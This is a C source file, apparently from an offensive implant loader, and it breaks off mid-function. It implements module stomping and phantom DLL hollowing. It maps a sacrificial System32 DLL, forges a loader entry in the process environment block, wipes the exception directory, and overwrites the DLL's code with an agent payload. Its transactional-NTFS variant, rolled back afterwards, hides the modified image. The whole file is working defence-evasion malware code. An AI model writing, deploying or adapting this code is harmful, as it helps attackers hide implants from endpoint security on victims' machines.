#include "stomp.h"

static PSP_PEB _sp_get_peb(void) {
    PSP_PEB peb;
#ifdef _M_X64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
#elif defined(_M_IX86)
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
#else
#error Unsupported architecture
#endif
    return peb;
}

#if defined(STOMP_TECHNIQUE) && (STOMP_TECHNIQUE == 1 || STOMP_TECHNIQUE == 2)

static SIZE_T _sp_wstrlen(const WCHAR* s) {
    SIZE_T n = 0;
    while (s[n]) n++;
    return n;
}

static void _sp_build_nt_path(const char* dllName, WCHAR* ntPath, int maxChars) {
    const WCHAR prefix[] = L"\\??\\C:\\Windows\\System32\\";
    int i = 0, pos = 0;
    while (prefix[i] && pos < maxChars - 1) ntPath[pos++] = prefix[i++];
    i = 0;
    while (dllName[i] && pos < maxChars - 1) ntPath[pos++] = (WCHAR)(unsigned char)dllName[i++];
    ntPath[pos] = L'\0';
}

static BOOL _sp_map_image(const char* dllName, PVOID* pViewBase, SIZE_T* pViewSize) {
    WCHAR ntPath[512];
    _sp_build_nt_path(dllName, ntPath, 512);

    SP_UNICODE_STRING uPath;
    uPath.Buffer        = ntPath;
    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

    SP_OBJECT_ATTRIBUTES objAttr;
    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);

    SP_IO_STATUS_BLOCK ioStatus = { 0 };
    HANDLE hFile = NULL;

    NTSTATUS status = NTDLL$NtOpenFile(
        &hFile,
        SYNCHRONIZE | FILE_READ_DATA | FILE_EXECUTE | FILE_READ_ATTRIBUTES,
        &objAttr,
        &ioStatus,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!SP_NT_SUCCESS(status) || !hFile) {
        StealthDbg("ERROR: NtOpenFile failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    HANDLE hSection = NULL;
    status = NTDLL$NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    NTDLL$NtClose(hFile);

    if (!SP_NT_SUCCESS(status) || !hSection) {
        StealthDbg("ERROR: NtCreateSection failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        (HANDLE)(LONG_PTR)-1,
        &viewBase, 0, 0,
        NULL,
        &viewSize,
        SP_VIEW_SHARE,
        0,
        PAGE_READONLY
    );
    NTDLL$NtClose(hSection);

    if (!SP_NT_SUCCESS(status) || !viewBase) {
        StealthDbg("ERROR: NtMapViewOfSection failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    *pViewBase = viewBase;
    *pViewSize = viewSize;
    return TRUE;
}

static VOID _sp_insert_fake_ldr_entry(PVOID viewBase, const char* dllName)
{
    PSP_PEB pPeb = _sp_get_peb();
    if (!pPeb || !pPeb->Ldr) return;

    PSP_PEB_LDR_DATA pLdr = pPeb->Ldr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);

    BYTE* block = (BYTE*)KERNEL32$VirtualAlloc(
        NULL, SP_FAKE_LDR_BLOCK_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!block) {
        StealthDbg("WARN: VirtualAlloc failed for fake LDR entry\n");
        return;
    }

    PSP_LDR_DDAG_NODE ddagNode = (PSP_LDR_DDAG_NODE)(PVOID)KERNEL32$VirtualAlloc(
        NULL, sizeof(SP_LDR_DDAG_NODE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    PSP_LDR_DATA_TABLE_ENTRY entry = (PSP_LDR_DATA_TABLE_ENTRY)(PVOID)block;
    WCHAR* fullBuf = (WCHAR*)(block + SP_FAKE_LDR_STRINGS_OFFSET);
    WCHAR* baseBuf = fullBuf + SP_FAKE_LDR_FULL_WCHARS;

    const WCHAR sysPrefix[] = L"C:\\Windows\\System32\\";
    int fpos = 0, i = 0;
    while (sysPrefix[i] && fpos < SP_FAKE_LDR_FULL_WCHARS - 1)
        fullBuf[fpos++] = sysPrefix[i++];
    i = 0;
    while (dllName[i] && fpos < SP_FAKE_LDR_FULL_WCHARS - 1)
        fullBuf[fpos++] = (WCHAR)(unsigned char)dllName[i++];
    fullBuf[fpos] = L'\0';

    int bpos = 0;
    i = 0;
    while (dllName[i] && bpos < SP_FAKE_LDR_BASE_WCHARS - 1)
        baseBuf[bpos++] = (WCHAR)(unsigned char)dllName[i++];
    baseBuf[bpos] = L'\0';

    if (ddagNode) {
        ddagNode->Modules.Flink        = &entry->NodeModuleLink;
        ddagNode->Modules.Blink        = &entry->NodeModuleLink;
        ddagNode->ServiceTagList.Flink = &ddagNode->ServiceTagList;
        ddagNode->ServiceTagList.Blink = &ddagNode->ServiceTagList;
        ddagNode->State                = SP_LDR_MODULES_READY_TO_RUN;
        ddagNode->LoadCount            = 1;
        entry->DdagNode                = (PVOID)ddagNode;
        entry->NodeModuleLink.Flink    = &ddagNode->Modules;
        entry->NodeModuleLink.Blink    = &ddagNode->Modules;
    } else {
        entry->NodeModuleLink.Flink    = &entry->NodeModuleLink;
        entry->NodeModuleLink.Blink    = &entry->NodeModuleLink;
    }

    entry->DllBase       = viewBase;
    entry->EntryPoint    = (PVOID)((ULONG_PTR)viewBase + nt->OptionalHeader.AddressOfEntryPoint);
    entry->SizeOfImage   = nt->OptionalHeader.SizeOfImage;
    entry->TimeDateStamp = nt->FileHeader.TimeDateStamp;
    entry->Flags         = SP_LDRP_IMAGE_DLL | SP_LDRP_ENTRY_PROCESSED;
    entry->LoadCount     = 1;

    entry->FullDllName.Buffer        = fullBuf;
    entry->FullDllName.Length        = (USHORT)(fpos * sizeof(WCHAR));
    entry->FullDllName.MaximumLength = (USHORT)((fpos + 1) * sizeof(WCHAR));

    entry->BaseDllName.Buffer        = baseBuf;
    entry->BaseDllName.Length        = (USHORT)(bpos * sizeof(WCHAR));
    entry->BaseDllName.MaximumLength = (USHORT)((bpos + 1) * sizeof(WCHAR));

    entry->HashLinks.Flink                  = &entry->HashLinks;
    entry->HashLinks.Blink                  = &entry->HashLinks;
    entry->InInitializationOrderLinks.Flink = &entry->InInitializationOrderLinks;
    entry->InInitializationOrderLinks.Blink = &entry->InInitializationOrderLinks;

    PSP_LIST_ENTRY loadTail           = pLdr->InLoadOrderModuleList.Blink;
    entry->InLoadOrderLinks.Flink     = &pLdr->InLoadOrderModuleList;
    entry->InLoadOrderLinks.Blink     = loadTail;
    loadTail->Flink                   = &entry->InLoadOrderLinks;
    pLdr->InLoadOrderModuleList.Blink = &entry->InLoadOrderLinks;

    PSP_LIST_ENTRY memTail              = pLdr->InMemoryOrderModuleList.Blink;
    entry->InMemoryOrderLinks.Flink     = &pLdr->InMemoryOrderModuleList;
    entry->InMemoryOrderLinks.Blink     = memTail;
    memTail->Flink                      = &entry->InMemoryOrderLinks;
    pLdr->InMemoryOrderModuleList.Blink = &entry->InMemoryOrderLinks;

    StealthDbg("fake LDR entry inserted: '%s' DllBase=%p SizeOfImage=0x%X TS=0x%X DdagNode=%p\n",
               dllName, viewBase, (unsigned)entry->SizeOfImage,
               entry->TimeDateStamp, entry->DdagNode);
}

#if STOMP_TECHNIQUE == 1

static BOOL StompPICONtSection( PICO_ARGS picoArgs ) {
    DWORD oldProt = 0;

    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    if (!_sp_map_image(picoArgs.sacrificialDll, &viewBase, &viewSize)) {
        StealthDbg("ERROR: _sp_map_image failed for PICO sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("NtSection mapped PICO DLL '%s' at %p (0x%zX bytes)\n", picoArgs.sacrificialDll, viewBase, viewSize);

    _sp_insert_fake_ldr_entry(viewBase, picoArgs.sacrificialDll);

    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);

    PVOID pTextSection = NULL;
    DWORD textSize     = 0;

    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
            pTextSection = (PVOID)((ULONG_PTR)viewBase + pSection->VirtualAddress);
            textSize     = pSection->Misc.VirtualSize;
            StealthDbg("NtSection: found .text at %p size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSection++;
    }

    if (!pTextSection || textSize == 0) {
        StealthDbg("ERROR: .text section not found in NtSection-mapped DLL\n");
        NTDLL$NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    {
        PIMAGE_DATA_DIRECTORY excDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            PVOID pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
            DWORD pdataSize = excDir->Size;
            DWORD hdProt = 0;
            KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt);
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
            KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);
            DWORD pdataProt = 0;
            KERNEL32$VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
            MSVCRT$memset(pdataBase, 0, pdataSize);
            KERNEL32$VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
        }
    }

    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);

    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);

    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;

    unsigned char* unwindSlot = code + picoCodeSize;
    unwindSlot[0] = 0x01;
    unwindSlot[1] = 0x00;
    unwindSlot[2] = 0x00;
    unwindSlot[3] = 0x00;

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress   = 0;
    rfTable[0].EndAddress     = picoCodeSize;
    rfTable[0].UnwindData     = picoCodeSize;

    DWORD coverSize = picoCodeSize + 4;
    SIZE_T regionSize = (SIZE_T)coverSize;
    NTDLL$NtProtectVirtualMemory((HANDLE)(LONG_PTR)-1, (PVOID*)&code, &regionSize, PAGE_EXECUTE_READ, &oldProt);
    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)viewBase);
    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
    return TRUE;
}

static BOOL StompDLLNtSection( DLL_ARGS dllArgs ) {
    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    if (!_sp_map_image(dllArgs.sacrificialDll, &viewBase, &viewSize)) {
        StealthDbg("ERROR: _sp_map_image failed for DLL sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("NtSection mapped DLL '%s' at %p (0x%zX bytes)\n", dllArgs.sacrificialDll, viewBase, viewSize);

    *(dllArgs.dll_dst) = (char*)viewBase;

    _sp_insert_fake_ldr_entry(viewBase, dllArgs.sacrificialDll);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + pDosHeader->e_lfanew);
    DWORD             dllSize    = pNtHeader->OptionalHeader.SizeOfImage;

    {
        PIMAGE_DATA_DIRECTORY excDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            PVOID pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
            DWORD pdataSize = excDir->Size;

            StealthDbg("StompDLL: excDir before: VirtualAddress=0x%X Size=0x%X\n", excDir->VirtualAddress, excDir->Size);

            DWORD hdProt = 0;
            BOOL  r1 = KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt);
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
            BOOL  r2 = KERNEL32$VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);

            StealthDbg("StompDLL: excDir zeroed (VP1=%d VP2=%d): VirtualAddress=%u Size=%u\n", r1, r2, excDir->VirtualAddress, excDir->Size);

            DWORD pdataProt = 0;
            BOOL  r3 = KERNEL32$VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
            MSVCRT$memset(pdataBase, 0, pdataSize);
            BOOL  r4 = KERNEL32$VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
            StealthDbg("StompDLL: pdataBase=%p pdataSize=0x%X zeroed (VP3=%d VP4=%d)\n", pdataBase, pdataSize, r3, r4);
        } else {
            StealthDbg("StompDLL: excDir already empty (VirtualAddress=%u Size=%u)\n", excDir->VirtualAddress, excDir->Size);
        }
    }

    DWORD oldProt = 0;
    BOOL  vpRet = KERNEL32$VirtualProtect(viewBase, dllSize, PAGE_READWRITE, &oldProt);
    StealthDbg("StompDLL: VirtualProtect(entire view, PAGE_READWRITE) = %d (old=0x%X)\n", vpRet, oldProt);
    MSVCRT$memset(viewBase, 0, dllSize);
    StealthDbg("StompDLL: memset done, calling LoadDLL...\n");

    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
    StealthDbg("StompDLL: LoadDLL done, calling ProcessImports...\n");
    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));
    StealthDbg("StompDLL: ProcessImports done\n");

    return TRUE;
}

#endif /* STOMP_TECHNIQUE == 1 */

#if STOMP_TECHNIQUE == 2

DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);

static BOOL _sp_read_file_to_buffer(const char* dllName, BYTE** ppBuf, ULONG* pFileSize) {
    WCHAR ntPath[512];
    _sp_build_nt_path(dllName, ntPath, 512);

    SP_UNICODE_STRING uPath;
    uPath.Buffer        = ntPath;
    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

    SP_OBJECT_ATTRIBUTES objAttr;
    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);

    SP_IO_STATUS_BLOCK ioStatus = { 0 };
    HANDLE hFile = NULL;

    NTSTATUS status = NTDLL$NtOpenFile(
        &hFile,
        SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &objAttr, &ioStatus,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!SP_NT_SUCCESS(status) || !hFile) {
        StealthDbg("ERROR: _sp_read_file: NtOpenFile failed for '%s': 0x%08X\n", dllName, (unsigned)status);
        return FALSE;
    }

    SP_FILE_STANDARD_INFORMATION fileInfo = { 0 };
    SP_IO_STATUS_BLOCK ioInfo = { 0 };
    status = NTDLL$NtQueryInformationFile(hFile, &ioInfo, &fileInfo, sizeof(fileInfo), SP_FileStandardInformation);
    if (!SP_NT_SUCCESS(status)) {
        StealthDbg("ERROR: _sp_read_file: NtQueryInformationFile failed: 0x%08X\n", (unsigned)status);
        NTDLL$NtClose(hFile);
        return FALSE;
    }

    ULONG fileSize = (ULONG)fileInfo.EndOfFile.QuadPart;
    BYTE* buf = (BYTE*)KERNEL32$VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        StealthDbg("ERROR: _sp_read_file: VirtualAlloc(%u) failed\n", fileSize);
        NTDLL$NtClose(hFile);
        return FALSE;
    }

    SP_IO_STATUS_BLOCK ioRead = { 0 };
    status = NTDLL$NtReadFile(hFile, NULL, NULL, NULL, &ioRead, buf, fileSize, NULL, NULL);
    NTDLL$NtClose(hFile);

    if (!SP_NT_SUCCESS(status)) {
        StealthDbg("ERROR: _sp_read_file: NtReadFile failed: 0x%08X\n", (unsigned)status);
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return FALSE;
    }

    *ppBuf     = buf;
    *pFileSize = fileSize;
    StealthDbg("Phantom: read '%s' into buffer (%u bytes)\n", dllName, fileSize);
    return TRUE;
}

static void _sp_build_temp_nt_path(const char* dllName, WCHAR* ntPath, int maxChars) {
    static const WCHAR prefix[] = L"\\??\\";
    WCHAR tempDir[MAX_PATH];

    DWORD tempDirLen = KERNEL32$GetTempPathW(MAX_PATH, tempDir);
    /* GetTempPathW always appends a backslash; strip it so we add our own */
    if (tempDirLen > 0 && tempDir[tempDirLen - 1] == L'\\')
        tempDir[--tempDirLen] = L'\0';

    int pos = 0;
    for (int i = 0; prefix[i] && pos < maxChars - 1; i++) ntPath[pos++] = prefix[i];
    for (int i = 0; tempDir[i] && pos < maxChars - 1; i++) ntPath[pos++] = tempDir[i];
    if (pos < maxChars - 1) ntPath[pos++] = L'\\';
    for (int i = 0; dllName[i] && pos < maxChars - 1; i++) ntPath[pos++] = (WCHAR)(unsigned char)dllName[i];
    ntPath[pos] = L'\0';
}

static BOOL _sp_map_image_phantom(const char* dllName, BYTE* fileBuf, ULONG fileSize,
                                   PVOID* pViewBase, SIZE_T* pViewSize) {
    WCHAR ntPath[512];
    _sp_build_temp_nt_path(dllName, ntPath, 512);

    /* 1. Create NTFS transaction */
    HANDLE hTxn = NULL;
    SP_OBJECT_ATTRIBUTES txnAttr;
    SP_INIT_OBJ_ATTR(txnAttr, NULL, 0);

    NTSTATUS status = NTDLL$NtCreateTransaction(
        &hTxn, TRANSACTION_ALL_ACCESS, &txnAttr,
        NULL, NULL, 0, 0, 0, NULL, NULL
    );
    if (!SP_NT_SUCCESS(status) || !hTxn) {
        StealthDbg("ERROR: NtCreateTransaction failed: 0x%08X\n", (unsigned)status);
        return FALSE;
    }
    StealthDbg("Phantom: transaction created: %p\n", hTxn);

    NTDLL$RtlSetCurrentTransaction(hTxn);

    SP_UNICODE_STRING uPath;
    uPath.Buffer        = ntPath;
    uPath.Length        = (USHORT)(_sp_wstrlen(ntPath) * sizeof(WCHAR));
    uPath.MaximumLength = uPath.Length + sizeof(WCHAR);

    SP_OBJECT_ATTRIBUTES objAttr;
    SP_INIT_OBJ_ATTR(objAttr, &uPath, SP_OBJ_CASE_INSENSITIVE);

    SP_IO_STATUS_BLOCK ioStatus = { 0 };
    HANDLE hTxnFile = NULL;

    status = NTDLL$NtCreateFile(
        &hTxnFile,
        GENERIC_WRITE | GENERIC_READ | SYNCHRONIZE,
        &objAttr, &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_SUPERSEDE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0
    );

    NTDLL$RtlSetCurrentTransaction(NULL);

    if (!SP_NT_SUCCESS(status) || !hTxnFile) {
        StealthDbg("ERROR: NtCreateFile (transacted) failed: 0x%08X\n", (unsigned)status);
        NTDLL$NtClose(hTxn);
        return FALSE;
    }
    StealthDbg("Phantom: opened transacted file handle: %p\n", hTxnFile);

    /* 3. Write the modified buffer to the transacted file */
    SP_IO_STATUS_BLOCK ioWrite = { 0 };
    status = NTDLL$NtWriteFile(hTxnFile, NULL, NULL, NULL, &ioWrite, fileBuf, fileSize, NULL, NULL);
    if (!SP_NT_SUCCESS(status)) {
        StealthDbg("ERROR: NtWriteFile (transacted) failed: 0x%08X\n", (unsigned)status);
        NTDLL$NtClose(hTxnFile);
        NTDLL$NtClose(hTxn);
        return FALSE;
    }
    StealthDbg("Phantom: wrote %u bytes to transacted file\n", fileSize);

    /* 4. Create SEC_IMAGE section from the transacted file */
    HANDLE hSection = NULL;
    status = NTDLL$NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL, NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTxnFile
    );
    NTDLL$NtClose(hTxnFile);

    if (!SP_NT_SUCCESS(status) || !hSection) {
        StealthDbg("ERROR: NtCreateSection (phantom) failed: 0x%08X\n", (unsigned)status);
        NTDLL$NtRollbackTransaction(hTxn, TRUE);
        NTDLL$NtClose(hTxn);
        return FALSE;
    }

    /* 5. Map the section */
    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        (HANDLE)(LONG_PTR)-1,
        &viewBase, 0, 0,
        NULL, &viewSize,
        SP_VIEW_SHARE, 0,
        PAGE_READONLY
    );
    NTDLL$NtClose(hSection);

    if (!SP_NT_SUCCESS(status) || !viewBase) {
        StealthDbg("ERROR: NtMapViewOfSection (phantom) failed: 0x%08X\n", (unsigned)status);
        NTDLL$NtRollbackTransaction(hTxn, TRUE);
        NTDLL$NtClose(hTxn);
        return FALSE;
    }

    /* 6. Rollback the transaction - on-disk file is unchanged */
    NTDLL$NtRollbackTransaction(hTxn, TRUE);
    NTDLL$NtClose(hTxn);
    StealthDbg("Phantom: transaction rolled back, view at %p (0x%zX bytes) - SharedOriginal intact\n",
               viewBase, viewSize);

    *pViewBase = viewBase;
    *pViewSize = viewSize;
    return TRUE;
}

static BOOL StompPICOPhantom( PICO_ARGS picoArgs ) {
    /* 1. Read the sacrificial DLL from disk into a temp buffer */
    BYTE*  fileBuf  = NULL;
    ULONG  fileSize = 0;
    if (!_sp_read_file_to_buffer(picoArgs.sacrificialDll, &fileBuf, &fileSize)) {
        return FALSE;
    }

    /* 2. Parse PE in the raw file buffer and find .text section */
    PIMAGE_DOS_HEADER     pDos     = (PIMAGE_DOS_HEADER)fileBuf;
    PIMAGE_NT_HEADERS     pNt      = (PIMAGE_NT_HEADERS)(fileBuf + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    DWORD textRawOffset = 0;
    DWORD textRawSize   = 0;
    DWORD textVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((*(DWORD*)pSection->Name | 0x20202020) == 'xet.') {
            textRawOffset = pSection->PointerToRawData;
            textRawSize   = pSection->SizeOfRawData;
            textVA        = pSection->VirtualAddress;
            StealthDbg("Phantom PICO: .text raw=0x%X size=0x%X VA=0x%X\n", textRawOffset, textRawSize, textVA);
            break;
        }
        pSection++;
    }

    if (!textRawOffset || !textRawSize) {
        StealthDbg("ERROR: Phantom PICO: .text section not found in raw file\n");
        KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);
        return FALSE;
    }

    PICO* tmpPico = (PICO*)(fileBuf + textRawOffset);
    char* bufCode = tmpPico->code;
    char* bufData = tmpPico->data;
    PicoLoad(picoArgs.funcs, picoArgs.pico_src, bufCode, bufData);
    StealthDbg("Phantom PICO: PicoLoad wrote to file buffer at offset 0x%X\n", textRawOffset);

    /* 4. Zero out the .pdata (exception directory) in the raw file */
    {
        PIMAGE_DATA_DIRECTORY excDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (excDir->VirtualAddress && excDir->Size) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pNt);
            for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, sec++) {
                if (sec->VirtualAddress == excDir->VirtualAddress) {
                    MSVCRT$memset(fileBuf + sec->PointerToRawData, 0, sec->SizeOfRawData);
                    StealthDbg("Phantom PICO: zeroed .pdata in raw file at offset 0x%X\n", sec->PointerToRawData);
                    break;
                }
            }
            excDir->VirtualAddress = 0;
            excDir->Size           = 0;
        }
    }

    /* 5. Create transacted section and map it */
    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;
    if (!_sp_map_image_phantom(picoArgs.sacrificialDll, fileBuf, fileSize, &viewBase, &viewSize)) {
        KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);
        return FALSE;
    }

    KERNEL32$VirtualFree(fileBuf, 0, MEM_RELEASE);

    *(picoArgs.pico_dst) = (PICO*)((ULONG_PTR)viewBase + textVA);

    {
        DWORD dataProt = 0;
        KERNEL32$VirtualProtect((*(picoArgs.pico_dst))->data, sizeof((*(picoArgs.pico_dst))->data), PAGE_READWRITE, &dataProt);
        StealthDbg("Phantom PICO: data region at %p made writable (code pages unchanged)\n", (*(picoArgs.pico_dst))->data);
    }


    {
        char* mapCode = (*(picoArgs.pico_dst))->code;
        char* mapData = (*(picoArgs.pico_dst))->data;
        LONGLONG delta = (LONGLONG)((ULONG_PTR)mapCode - (ULONG_PTR)bufCode);
        StealthDbg("Phantom PICO: fixup delta = 0x%llX (buf=%p map=%p)\n", (unsigned long long)delta, bufCode, mapCode);

        if (delta != 0) {
            unsigned char* meta = (unsigned char*)picoArgs.pico_src + 0x10;
            int codePatches = 0;
            int dataPatches = 0;
            while (*meta) {
                unsigned char type = meta[0];
                unsigned char sub  = meta[1];

                if (type == 1) {
                    int offset = *(int*)(meta + 4);
                    if (sub == 2 || sub == 3) {
                        /* Data-section patch - safe to fix (data page is writable) */
                        *(ULONGLONG*)(mapData + offset) += delta;
                        dataPatches++;
                    } else if (sub == 0 || sub == 1) {
                        /* Code-section patch - would need to write to code page.
                         * Make code page temporarily writable, fix, restore. */
                        DWORD tmpProt = 0;
                        KERNEL32$VirtualProtect(mapCode + offset, sizeof(ULONGLONG), PAGE_READWRITE, &tmpProt);
                        *(ULONGLONG*)(mapCode + offset) += delta;
                        KERNEL32$VirtualProtect(mapCode + offset, sizeof(ULONGLONG), tmpProt, &tmpProt);
                        codePatches++;
                    }
                }

                short nextOff = *(short*)(meta + 2);
                if (nextOff <= 0) break;
                meta += nextOff;
            }
            StealthDbg("Phantom PICO: fixup applied: %d data patches, %d code patches\n", dataPatches, codePatches);
            if (codePatches > 0) {
                StealthDbg("WARN: Phantom PICO: %d code-section patches may affect SharedOriginal on those pages\n", codePatches);
            }
        }
    }

    /* 7. Insert fake LDR entry */
    _sp_insert_fake_ldr_entry(viewBase, picoArgs.sacrificialDll);

    /* 8. Register exception handlers */
    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*(picoArgs.pico_dst))->code;

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress = 0;
    rfTable[0].EndAddress   = picoCodeSize;
    rfTable[0].UnwindData   = picoCodeSize;

    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)viewBase);
    KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);

    StealthDbg("Phantom PICO: done - code at %p, SharedOriginal pages\n", code);
    return TRUE;
}

static BOOL StompDLLPhantom( DLL_ARGS dllArgs ) {
    PVOID  viewBase = NULL;
    SIZE_T viewSize = 0;

    if (!_sp_map_image(dllArgs.sacrificialDll, &viewBase, &viewSize)) {
        return FALSE;
    }

    *(dllArgs.dll_dst) = (char*)viewBase;

    _sp_insert_fake_ldr_entry(viewBase, dllArgs.sacrificialDll);

    PIMAGE_DOS_HEADER vDos = (PIMAGE_DOS_HEADER)viewBase;
    PIMAGE_NT_HEADERS vNt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + vDos->e_lfanew);
    DWORD imageSize = vNt->OptionalHeader.SizeOfImage;

    DWORD oldProt = 0;
    //KERNEL32$VirtualProtect(viewBase, imageSize, PAGE_READWRITE, &oldProt);
    for (DWORD offset = 0; offset < imageSize; offset += 0x900) {
        DWORD chunkSize = (offset + 0x900 <= imageSize) ? 0x900 : (imageSize - offset);
        DWORD chunkProt = 0;
        BOOL vpRet = KERNEL32$VirtualProtect((PVOID)((ULONG_PTR)viewBase + offset), chunkSize, PAGE_READWRITE, &chunkProt);
    }

    MSVCRT$memset(viewBase, 0, imageSize);

    StealthDbg("Phantom DLL: SEC_IMAGE mapped '%s' at %p (0x%X bytes), stomping agent\n", dllArgs.sacrificialDll, viewBase, imageSize);

    LoadDLL(dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst));
    ProcessImports(dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst));

    StealthDbg("Phantom DLL: LoadDLL + ProcessImports done\n");
    return TRUE;
}

#endif /* STOMP_TECHNIQUE == 2 */

#endif /* STOMP_TECHNIQUE == 1 || 2 */

static void _sp_patch_ldr_entry(PVOID moduleBase) {
    PSP_PEB pPeb = _sp_get_peb();
    if (!pPeb || !pPeb->Ldr) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + dos->e_lfanew);

